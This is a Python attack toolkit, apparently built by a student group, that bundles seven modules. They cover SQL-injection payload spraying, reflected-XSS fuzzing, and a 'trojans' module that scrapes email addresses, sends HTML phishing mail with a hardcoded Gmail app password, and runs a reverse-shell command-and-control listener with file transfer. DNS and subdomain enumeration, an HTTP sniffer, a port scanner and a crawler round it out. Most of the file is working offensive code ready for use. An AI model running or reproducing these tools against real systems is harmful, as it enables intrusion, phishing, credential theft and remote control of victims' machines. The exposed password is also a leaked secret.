from colorama import Fore, Back, Style
from urllib.parse import urlparse, urljoin, unquote, urlsplit
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bs
from collections import deque
from termcolor import colored
from scapy.layers import http
from pprint import pprint
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText
import requests
import re
import json
import subprocess
import sys
import os
import time 
import errno
import random
import argparse
import smtplib
import socket
import pyfiglet
import scapy.all as scapy
from scapy.layers import http
import secrets
import string 
import dns.resolver
import shutil


class sql_injection:
    def __init__(self, url =None):
        
        self.url = url
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
        if url == None:
            print("[-] No URLs to scan")
        else:
            self.scan(url)

    def get_all_forms(self, url):
        """Gets all forms from the HTML content of a given URL."""
        response = self.session.get(url)
        soup = bs(response.content, "html.parser")
        return soup.find_all("form")

    def get_form_details(self, form):
        details = {}
        # get the form action (target url)
        try:
            action = form.attrs.get("action").lower()
        except:
            action = None
        # get the form method (POST, GET, etc.)
        method = form.attrs.get("method", "get").lower()
        # get all the input details such as type and name
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({"type": input_type, "name": input_name, "value": input_value})
        # put everything to the resulting dictionary
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def is_vulnerable(self, response):
        """Checks if a page is SQL Injection vulnerable based on its response."""
        error_strings = {
            "you have an error in your sql syntax;",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
        }
        return any(error in response.content.decode().lower() for error in error_strings)

    def scan_url(self, url):
        """Scans a URL for SQL Injection vulnerabilities."""
        for quote in "\"'":
            new_url = f"{url}{quote}"
            print(f"[!] Trying {new_url}")
            response = self.session.get(new_url)
            if self.is_vulnerable(response):
                print("[+] SQL Injection vulnerability detected, link:", new_url)
                return

    def scan_forms(self, url):
        forms = self.get_all_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")
        for form in forms:
            form_details = self.get_form_details(form)
            for c in "\"'":
                # the data body we want to submit
                data = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        # any input form that is hidden or has some value,
                        # just use it in the form body
                        try:
                            data[input_tag["name"]] = input_tag["value"] + c
                        except:
                            pass
                    elif input_tag["type"] != "submit":
                        # all others except submit, use some junk data with special character
                        data[input_tag["name"]] = f"test{c}"
                # join the url with the action (form request URL)
                url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    res = self.session.post(url, data=data)
                elif form_details["method"] == "get":
                    res = self.session.get(url, params=data)
                # test whether the resulting page is vulnerable
                if self.is_vulnerable(res):
                    print("[+] SQL Injection vulnerability detected, link:", url)
                    print("[+] Form:")
                    pprint(form_details)
                    break
    def attack(self, url):
        payloads = [
            "' or ",
            "-- or #",
            "' OR '1",
            "' OR 1 -- -",
            "' OR "" = '",
            "' OR 1 = 1 -- -",
            "' OR '' = '",
            "'='",
            "'LIKE'",
            "'=0--+",
            "' OR 1=1",
            "' OR 'x'='x",
            "' AND id IS NULL; --",
        ]
        failed = None
        for payload in payloads:
            req = requests.post(url, data=payload)
            if req.status_code != 200:
                failed = payload
                print("payload failed sent! payload: "+failed)
                break
        print("Payload sent!")

    def scan(self, url):
        """Scans a URL for SQL Injection vulnerabilities in both the URL itself and in HTML forms."""
        self.scan_url(url)
        self.scan_forms(url)
        self.attack(url)
        
class tracexss:
    def __init__(self, domain=None, filename=None, url=None, output=None):
             
        self.threads = 1
        self.filename = filename
        self.output = output
        self.url = url
        self.domain = domain
        self.result = []
        self.urls = []
        
        if not domain and not filename and not url and not output:
        	print("[-] Complete the argument for domain/filename/url/output file")
        try:
            if filename == None:
                if url == None and not domain == None:
                    self.crawl(domain)
                    filename = f"output/crawl/{domain}.txt"
                    if os.path.exists(filename):
                        urls = self.read(filename)
                    else:
                        filename = f"results/crawl/{domain}.txt"
                        urls = self.read(filename)
                elif not url == None and domain == None:
                    self.scanner(url)
                    if self.result:
                        self.write(output,self.result[0])
                    exit()
            else:
                urls = self.read(filename)
            if urls:
                print(Fore.GREEN + f"[+] CURRENT THREADS: {self.threads}")
                '''
                for url in urls:
                    vuln = self.scanner(url)
                '''
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                     executor.map(self.scanner,urls)
                for i in self.result:
                    self.write(output,i)
            print(Fore.WHITE + "[+] COMPLETED")
        except Exception as e:
            print(e)
        
    def read(self,filename):
        '''
        Read & sort GET  urls from given filename
        '''
        print(Fore.WHITE + "READING URLS")
        urls = subprocess.check_output(f"cat {filename} | grep '=' | sort -u",shell=True).decode('utf-8')
        if not urls:
            print(Fore.GREEN + f"[+] NO URLS WITH GET PARAMETER FOUND")
        return urls.split()

    def write(self, output, value):
        '''
        Writes the output back to the given filename.
        '''
        if not output:
            return None
        subprocess.call(f"echo '{value}' >> {output}",shell=True)

    def replace(self,url,param_name,value):
        return re.sub(f"{param_name}=([^&]+)",f"{param_name}={value}",url)
        
    def bubble_sort(self, arr):
        '''
        For sorting the payloads
        '''
        a = 0
        keys = []
        for i in arr:
            for j in i:
                keys.append(j)
        while a < len(keys) - 1:
            b = 0
            while b < len(keys) - 1:
                d1 = arr[b]
                d2 = arr[b + 1]
                if len(d1[keys[b]]) < len(d2[keys[b+1]]):
                    d = d1
                    arr[b] = arr[b+1]
                    arr[b+1] = d
                    z = keys[b+1]
                    keys[b+1] = keys[b]
                    keys[b] = z
                b += 1
            a += 1
        return arr
    
    def crawl(self, domain):
        self.domain = domain
        '''
        Use this method to crawl the links using katana (return type: None)
        '''
        print(Fore.BLUE + "[+] CRAWLING DOMAIN")
        crawling = Crawler(domain)
        return None

    def parameters(self, url):
        '''
        This function will return every parameter in the url as dictionary.
        '''
        param_names = []
        params = urlparse(url).query
        params = params.split("&")
        if len(params) == 1:
            params = params[0].split("=")
            param_names.append(params[0])
        else:
            for param in params:
                param = param.split("=")
                param_names.append(param[0])
        return param_names

    def parser(self, url, param_name, value):
        '''
        This function will replace the parameter's value with the given value and returns a dictionary
        '''
        final_parameters = {}
        parsed_data = urlparse(url)
        params = parsed_data.query
        protocol = parsed_data.scheme
        hostname = parsed_data.hostname
        path = parsed_data.path
        params = params.split("&")
        if len(params) == 1:
            params = params[0].split("=")
            final_parameters[params[0]] = params[1]
        else:
            for param in params:
                param = param.split("=")
                final_parameters[param[0]] = param[1]
        final_parameters[param_name] = value
        return final_parameters

    def validator(self, danger_char, param_name, url):
        dic = {param_name: []}
        char = string.ascii_letters + string.digits ###rev
        randomstr = ''.join(secrets.choice(char) for _ in range (12)) ###rev
        try:
            for data in danger_char:
                final_parameters = self.parser(url,param_name,data + randomstr)
                new_url = urlparse(url).scheme + "://" + urlparse(url).hostname + "/" + urlparse(url).path
                response = requests.get(new_url,params=final_parameters,verify=False).text
                if data + randomstr in response:
                    print(Fore.GREEN + f"[+] {data} is reflecting in the response")
                    dic[param_name].append(data)
        except Exception as e:
            print(e)
        return dic

    def fuzzer(self, url):
        data = []
        dangerous_characters = [  # You can add dangerous characters here
            ">",
            "'",
            '"',
            "<",
            "/",
            ";"
        ]
        parameters = self.parameters(url)
        if '' in parameters and len(parameters) == 1:
            print(f"[+] NO GET PARAMETER IDENTIFIED...EXITING")
            exit()
        print(f"[+] {len(parameters)} parameters identified")
        for parameter in parameters:
            print(Fore.WHITE + f"[+] Testing parameter name: {parameter}")
            out = self.validator(dangerous_characters,parameter,url)
            data.append(out)
        print("[+] FUZZING HAS BEEN COMPLETED")
        return self.bubble_sort(data)

    def filter_payload(self,fuzz_char):
        payload_list = []
        size = int(len(fuzz_char) / 2)
        print(Fore.WHITE + f"[+] LOADING PAYLOAD FILE payloads.json")
        dbs = open("payloads.json")
        dbs = json.load(dbs)
        new_dbs = []
        for i in range(0,len(dbs)):
            if not dbs[i]['waf']:
                new_dbs.append(dbs[i])
        dbs = new_dbs
        for char in fuzz_char:
            for payload in dbs:
                attributes = payload['Attribute']
                if char in attributes:
                    payload['count'] += 1
        def fun(e):
            return e['count']
        dbs.sort(key=fun,reverse=True)
        for payload in dbs:
            if payload['count'] == len(fuzz_char) and len(payload['Attribute']) == payload['count'] :
                print(Fore.GREEN + f"[+] FOUND SOME PERFECT PAYLOADS FOR THE TARGET")
                payload_list.insert(0,payload['Payload'])
                continue
            if payload['count'] > size:
                payload_list.append(payload['Payload'])
                continue
        return payload_list

    def scanner(self,url):
        print(Fore.WHITE + f"[+] TESTING {url}")
        out = self.fuzzer(url)
        for data in out:
            for key in data:
                payload_list = self.filter_payload(data[key])
            for payload in payload_list:
                try:
                    data = self.parser(url,key,payload)
                    parsed_data = urlparse(url)
                    new_url = parsed_data.scheme +  "://" + parsed_data.netloc + parsed_data.path
                    response = requests.get(new_url, params=data,verify=False).text
                    if payload in response:
                        print(Fore.RED + f"[+] VULNERABLE: {url}\nPARAMETER: {key}\nPAYLOAD USED: {payload}")
                        print(self.replace(url,key,payload))
                        self.result.append(self.replace(url,key,payload))
                        return True
                except Exception as e:
                    print(e)
        print(Fore.LIGHTWHITE_EX + f"[+] TARGET SEEMS TO BE NOT VULNERABLE")
        return None

class trojans:
    def __init__(self, url=None, mode=None, limit=None, sender=None, receiver=None, subject=None, html_file_path=None, message=None, ip=None, port=None):
        self.url = url
        self.mode = mode
        self.limit = limit
        self.sender = sender
        self.receiver = receiver
        self.subject = subject
        self.html_file = html_file_path
        self.message = message
        self._target = None
        self.email_sent = False
        self.ip = ip
        self.port = port
        
        #program diawal akan menampilkan fungsi display_program dilanjutkan dengan penentuan mode
        if not url and not mode and not limit and not sender and not receiver and not subject and not message and not ip and not port:
            self.display_program_information()
        else:
            if mode == "scraper_email":
                if url and limit:
                    self.scraper_emails(url, limit)
                elif url and not limit:
                    self.scraper_emails(url, 20)
                else:
                    print("Usage: python3 rks.py -m 3 -trojans scraper_email -u <url target scrape> -l <batasan pencarian>")
            elif mode == "send_email":
                if sender and receiver and subject and html_file_path and not self.email_sent:
                    self.send_email(sender, receiver, subject, html_file_path, message=self.message)
                    self.email_sent = True
                elif self.email_sent:
                    print("Email sudah terkirim sebelumnya")
                else:
                    print("Usage: python3 rks.py -m 3 -trojans send_email -s <emailpengirim> -r <emailpenerima> -su <judul_email> --html_file <nama file html> --message <isi pesan>")
            elif mode == "listening":
                    self.listening(ip, int(port))  # Panggil fungsi listening jika command adalah listening
            else:
                print("Mode tidak tersedia")

    def display_program_information(self):
        print("Pilih command dengan parameter berikut:")
        print("1. Usage: python3 rks.py -m 3 -trojans scraper_email -u <url_target_scrape> -l  <limit pencarian>")
        print("2. Usage: python3 rks.py -m 3 -trojans send_email -s <emailpengirim> -r <emailpenerima> -su <judul_email> --html_file <nama file html> --message <isi pesan>")
        print("3. Usage: python3 rks.py -m 3 -trojans listening -ip <ip server> -p <port>")

    def scraper_emails(self, user_url, limit):
        urls = deque([user_url])
        scraped_urls = set()
        emails = set()
        count = 0
        limit = int(limit)

        try:
            while urls:
                count += 1
                if count > limit:
                    break

                url = urls.popleft()
                scraped_urls.add(url)
                parts = urlsplit(url)
                base_url = f'{parts.scheme}://{parts.netloc}'
                path = url[:url.rfind('/') + 1] if '/' in parts.path else url

                print(f'{count} Memproses {url}')

                try:
                    response = requests.get(url)
                except(requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
                    continue

                new_emails = set(re.findall(r'[a-z0-9\.\-+_]+@\w+\.+[a-z\.]+', response.text, re.I))
                emails.update(new_emails)

                soup = bs(response.text, 'html.parser')
                for anchor in soup.find_all('a'):
                    link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
                    if link.startswith('/'):
                        link = base_url + link
                    elif not link.startswith('http'):
                        link = path + link

                    if not link in urls and not link in scraped_urls:
                        urls.append(link)
        except KeyboardInterrupt:
            print('[-] Closing!')

        print('\nProses Selesai!')
        print(f'{len(emails)} email ditemukan \n ==============================')

        for mail in emails:
            print('  ' + mail)
        print('\n')

    def send_email(self, sender, receiver, subject, html_file_path, message=None):
        if self.email_sent:
            print("===============================================")
            return

        email = sender
        receiver_email= receiver

        if message is None:
            message = self.message

        with open(html_file_path, "r") as html_file:
            html_content = html_file.read()

        html_content = f"<p>{message}</p>" + html_content

        html_part = MIMEText(html_content, "html")
        message = MIMEMultipart()
        message.attach(html_part)

        message["Subject"] = subject
        message["From"] = email
        message["To"] = receiver_email


        #text = f"Subject: {subject}\n\n{message}"
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, "swjzglceofzyfhgo")
            server.sendmail(email, receiver_email, message.as_string())
            server.quit()
            print("Email sudah terkirim ke " + receiver_email)
        
        except Exception as e:
            print("Error:", str(e))

    def listening(self, ip, port):
        try:
            #definisi variabel
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #untuk membuat reverse TCP connection
            soc.bind((ip, int(port)))
            print('Menunggu koneksi dari target ... ')
            soc.listen(1)

            while True:
                koneksi = soc.accept()
                #buat variabel dari hasil soc.accept()
                self._target = koneksi[0] 
                client_ip = koneksi[1]
                print(self._target)
                print(f'Terhubung ke target {str(client_ip)}')
                print("Berhasil memperoleh shell!")
                print("")
                command = self.komunikasi_shell()
                if command.lower() in ('exit', 'quit'):
                    break
        except OSError as e:
            if e.errno == 98:
                print("Good Luck!")
            else:
                raise
        finally:
            soc.close()

        # fungsi untuk menerima kembali inputan dari target 
    def data_diterima(self):
        data = ''
        while True:     
            try:
                data = data + self._target.recv(1024).decode().rstrip() # untuk menerima data gunakan fungsi _recv dan mendefiniskan ukuran dalam byte, dan lakukan decoding dari data
                return json.loads(data)
            except ValueError: # jika ada salah akan dilanjutkan, dan koneksi tidak terputus
                continue

    def download_file(self, namafile):
        file = open(namafile, 'wb')
        _target.settimeout(1)
        _file = _target.recv(1024)
        while _file:
            file.write(_file)
            try:
                _file = _target.recv(1024)
            except socket.timeout as e:
                break
        _target.settimeout(None)
        file.close()

    def upload_file(self, namafile):
        file = open(namafile, 'rb')
        _target.send(file.read())
        file.close()

        # membuat fungsi untuk menerima hasil eksekusi command ke sisi hacker
    def komunikasi_shell(self):
        while True:
            perintah = input('trogger>> ')
            data = json.dumps(perintah) #fungsi dari json yaitu untuk melakukan dumps dari perintah
            self._target.send(data.encode()) #mengirimkan perintah ke shell target, target.send merupakan fungsi dari lib socket
            if perintah.lower() in ('exit', 'quit'):
                break
            elif perintah == 'clear':
                os.system('clear') #untuk menghapus command shell sebelumnya import modul os
            elif perintah [:3] == 'cd ':
                pass
            elif perintah[:8] == 'download':
                self.download_file(perintah[9:]) 
            elif perintah[:6] == 'upload':
                self.upload_file(perintah[7:])
            elif perintah == 'start_keylogger':
                pass
            elif perintah == 'baca_data':
                data = self._target.recv(1024).decode()
                print(data)
            elif perintah == 'stop_keylogger':
                pass
            else:
                hasil = self.data_diterima() #memanggil fungsi data_diterima
                print(hasil)
        return perintah

class enumm:
    def __init__(self, domain=None, output_file=None):
        self.domain = domain
        self.output_file = output_file
        
        if not domain:
        	print("[-] Please specify domain for enumeration")
        else:
            try:
                print (f'DNS Enumeration Tool\n')
                dns_output = self.dns_enum(domain)
                print(f'\nWeb Enumeration Tool')
                self.webenum(domain, dns_output)
        
            except:
                print(f"Layanan telah berhenti")
                exit()

    def dns_enum(self, domain):
        record_types = ['A', 'AAAA', 'NS', 'CNAME', 'MX', 'PTR', 'SOA', 'TXT']
        dns_output = []

        for records in record_types:
            try:
                answer = dns.resolver.resolve(domain, records)
                print(f'{records} Records' + '\n')
                dns_output.append(f'{records} Records' + '\n')
                for server in answer:
                    dns_output.append(server.to_text())
                    print(server.to_text())
            except dns.resolver.NoAnswer:
                dns_output.append('No record found for ' + records)
                print('No record found for ', records)
                pass
            except dns.resolver.NXDOMAIN:
                print(f'Link {domain} tidak tersedia, silahkan masukan domain valid')
                quit()
            print('='*30)
        return dns_output
            
    def webenum(self, domain, dns_output):
        sub_list = open("subdomain.txt").read()
        subs = sub_list.splitlines()
        jumlah_output = 0
        with ThreadPoolExecutor(max_workers=1000) as executor:
            results = list(executor.map(self.check_subdomain, subs, [domain]*len(subs)))

        valid_domains = [result for result in results if result is not None]
        self.save_to_file(dns_output, valid_domains)
        for valid_domain in valid_domains:
            print("Valid domain:", valid_domain)
            jumlah_output = jumlah_output + 1
        print(f"jumlah valid domain = {jumlah_output}")

    def check_subdomain(self, sub, domain):
        sub_domain = f"http://{sub}.{domain}"

        try:
            response = requests.get(sub_domain, timeout=20)
            response.raise_for_status()
            #print(f'Connecting to {sub_domain}')
        except requests.RequestException:
            return None
        else:
            return sub_domain

    def save_to_file(self, dns_output, valid_domains):
        if self.output_file:
            with open(self.output_file, 'w') as file:
                file.write("DNS Enumeration Results:\n")
                for line in dns_output:
                    file.write(line + '\n')
                file.write("\nWeb Enumeration Results:\n")
                for valid_domain in valid_domains:
                    file.write(f"Valid domain: {valid_domain}\n")

class sniffer:
    def __init__(self, interface=None):
        self.interface = interface
        #self.check_sudo()
        available_interface = scapy.get_if_list()
        if interface ==  None:
            print("[-] Please specify an interface to listen on.")
        else:  
            if interface in available_interface:
                self.sniffer(interface)
            else:
                print("[-] The specified interface is not available on this device. For example eth0 or wlan0.")
                return

    def sniffer(self, interface): #Listens on specified port
        print(f"[+] Listening on interface {interface}\n")
        scapy.sniff(iface=interface, store=False, prn=self.sniffed_packet)

    def sniffed_packet(self, packet):
        if packet.haslayer(http.HTTPRequest):
            print(packet.show())

    def check_sudo(self):
        if os.geteuid() != 0:
            print("[-] This script requires root privileges (sudo) to run.")
            print("[-] Please run the script with sudo.")
            exit()

class port_scan:
    def __init__(self,  domain=None, ip=None, port=None):
        self.domain = domain
        self.port = port
        self.ip = ip
        if domain and port:
            self.scan(domain)
        elif ip and port:
            self.scan(ip)
        else:
            print("[-] Please specify target domain/ip address and port to scan")	
        
    def scan_port(self, target, port):
        """Scans a single port and prints its status."""
        try:
            sock = socket.socket()
            sock.connect((target, port))
            serviceversion = sock.recv(1024)
            serviceversion = serviceversion.decode('utf-8')
            serviceversion = serviceversion.strip('\n')
            portstate = f"Port {str(port)} is open"
            print(colored(portstate, 'green'), end='      ')
            print(serviceversion)
        except ConnectionRefusedError:
            print(colored(f"Port {str(port)} is closed", 'red'))
        except UnicodeDecodeError:
            print(colored(f"Port {str(port)} is open", 'green'))

    def scan(self, target):
        """Scans ports based on the provided port range or specification."""
        if self.port == "all":
            for port in range(1, 65535):
                self.scan_port(target, port)
        elif "-" in self.port:
            portrange = self.port.split('-')
            start = int(portrange[0])
            end = int(portrange[1])
            for port in range(start, end + 1):
                self.scan_port(target, port)
        
        else:
            self.scan_port(target, int(self.port))

        
class Crawler:
    def __init__(self, domain):
        self.domain=domain
        url = f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=txt&fl=original&collapse=urlkey&page=/"
        retry = True
        retries = 0
        if not domain:
        	print("[-] No domain for crawling")
        else:
            while retry == True and retries <= 3:
                 response, retry = self.connector(url)
                 retry = retry
                 retries += 1
            if response == False:
                 return
            response = unquote(response)
            final_uris = self.param_extract(response)
            self.save_func(final_uris, domain)

            print(f"\n\u001b[32m[+] Total number of retries:  {retries-1}\u001b[31m")
            print(f"\u001b[32m[+] Total unique urls found : {len(final_uris)}\u001b[31m") 
            print(f"\u001b[32m[+] Crawling output is saved here   :\u001b[31m \u001b[36moutput/crawl/{domain}.txt\u001b[31m")
    
    def save_func(self, final_urls, domain):
        filename = f"output/crawl/{domain}.txt"
    
        if os.path.exists(filename):
            os.remove(filename)

        if not os.path.exists(os.path.dirname(filename)):
            try:
                os.makedirs(os.path.dirname(filename))
            except OSError as exc: 
                if exc.errno != errno.EEXIST:
                    raise
    
        for i in final_urls:
            with open(filename, "a" , encoding="utf-8") as f:
                f.write(i+"\n")

    def param_extract(self, response):
        placeholder = "FUZZ"
        ''' 
        Function to extract URLs with parameters (ignoring the black list extention)
        regexp : r'.*?:\/\/.*\?.*\=[^$]'
    
        '''
        parsed = list(set(re.findall(r'.*?:\/\/.*\?.*\=[^$]' , response)))
        final_uris = []
        
        for i in parsed:
            delim = i.find('=')
            final_uris.append((i[:delim+1] + placeholder))
    
        return list(set(final_uris))
        
    def connector(self, url):
        result = False
        user_agent_list = [
        #Chrome
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
        'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
        #Firefox
        'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
        'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
        'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
        ]
        user_agent = random.choice(user_agent_list)
        headers = {'User-Agent': user_agent}
 
        try:
            # TODO control request headers in here
                response = requests.get(url,headers=headers ,timeout=30)
                result = response.text
                retry = False
                response.raise_for_status()
        except requests.exceptions.ConnectionError as e:
                retry = False
                print("\u001b[31;1mCan not connect to server. Check your internet connection.\u001b[0m")
        except requests.exceptions.Timeout as e:
                retry = True
                print("\u001b[31;1mOOPS!! Timeout Error. Retrying in 2 seconds.\u001b[0m")
                time.sleep(2)
        except requests.exceptions.HTTPError as err:
                retry = True
                print(f"\u001b[31;1m {err}. Retrying in 2 seconds.\u001b[0m")
                time.sleep(2)
        except requests.exceptions.RequestException as e:
                retry = True
                print("\u001b[31;1m {e} Can not get target information\u001b[0m")
        except KeyboardInterrupt as k:
                retry = False
                print("\u001b[31;1mInterrupted by user\u001b[0m")
                raise SystemExit(k)
        finally:
                return result, retry
class banner:
	def __init__(self, modul, author):
		terminal_width, _ = shutil.get_terminal_size()
		self.modul = modul
		self.author = author
		text = """
_____ ____   _   _  ====   _____ _____
|____ |___|  || // ||  ||  |____ |____
 |____ |   \  ||<<  ||><||  |____  ____|
|| || ||  ||
------------==============-------------
Hacking Tools by III RKS TRACE
\/
\/
            """
		lines = text.split('\n')
		for line in lines:
			indentation = (terminal_width - len(line)) // 2
			print(Fore.BLUE+ " " * indentation + line + Fore.WHITE)
		self.modbanner(modul, author)
	def modbanner(self, modul, author):
        	terminal_width = os.get_terminal_size().columns
        	modul_ascii = pyfiglet.figlet_format(modul, font="pagga")
        	modul_lines = modul_ascii.split('\n') 
        	colored_author = colored("Author: " + author, "yellow")
        	modul_centered = '\n'.join(line.center(terminal_width) for line in modul_lines)
        	author_centered = colored_author.center(terminal_width)
        	author_with_space = " " * 4 + author_centered
        	result = f"{modul_centered}\n{author_with_space}"
        	print(result)
        
if __name__ == "__main__":  
    parser = argparse.ArgumentParser()
    parser.add_argument('-m', dest='module', help='Select the module to be used. Eg: 1, 2, 3, etc', type=int, required=True)
    parser.add_argument('-d', dest='domain', help='Scrapping url from domain name of the target [ex: hackerone.com]')
    parser.add_argument('-f', dest='filename', help='Specify Filename. Eg: urls.txt etc')
    parser.add_argument('-u', dest='url', help='Scan a single URL. Eg: http://example.com/?id=2')
    parser.add_argument('-o', dest='output', help='Filename to store output. Eg: result.txt')
    parser.add_argument('-i', dest='interface', help='Interface target on module 5-Sniffer')
    parser.add_argument('-p', dest='port', help='Port target on module 6-PortScanner and 3-Trojans')
    
    parser.add_argument('-trojans', dest='trojans', help='Trojans Mode')
    parser.add_argument('-l', dest='limit', help='Limit in Trojans')
    parser.add_argument('-s', dest='sender', help='Email sender in Trojans')
    parser.add_argument('-r', dest='receiver', help='Email Receiver in Trojans')
    parser.add_argument('-su', dest='subject', help='Email Subject in Trojans')
    parser.add_argument('-msg', dest='message', help='Email content in Trojans')
    parser.add_argument('-html', dest='html_file')
    parser.add_argument('-ip', dest='ip')

    args = parser.parse_args()

    module= args.module
    domain = args.domain
    filename = args.filename
    url = args.url
    output = args.output
    interface = args.interface
    port = args.port
    
    trojans_mode = args.trojans
    limit = args.limit
    sender = args.sender
    receiver = args.receiver
    subject = args.subject
    html_file_path = args.html_file
    message = args.message
    ip = args.ip
    

    if module == 1:
        banner = banner("SQLI-SCANNER", "Zybar, Ardian, Syahra")
        module = sql_injection(url)
    elif module == 2:
        banner = banner("TRACE-XSS", "Qori, Anwar, Bepe")
        module = tracexss(domain, filename, url, output)
    elif module == 3:
        banner = banner("TROJANS", "Taqi, Ibad, Krama")
        module = trojans(url,trojans_mode, limit, sender, receiver, subject, html_file_path, message=message, ip=ip, port=port)
    elif module == 4:
        banner = banner("DNS-ENUM", "Aldien, Akrom, Abzak")
        module = enumm(domain, output)
    elif module == 5:
        banner = banner("CRYPTO-SPYDER", "Luri, Riyyu, Cakwan")
        module = sniffer(interface)
    elif module == 6:
        banner = banner("PORT-SCAN", "Ozy, Arkan, Zia")
        module = port_scan(domain, ip, port)
    elif module == 7:
        banner = banner("CRAWLER", "Qori, Anwar, Bepe")
        module = Crawler(domain)
    else:
        print("Invalid module choice. Please provide a valid module number.")

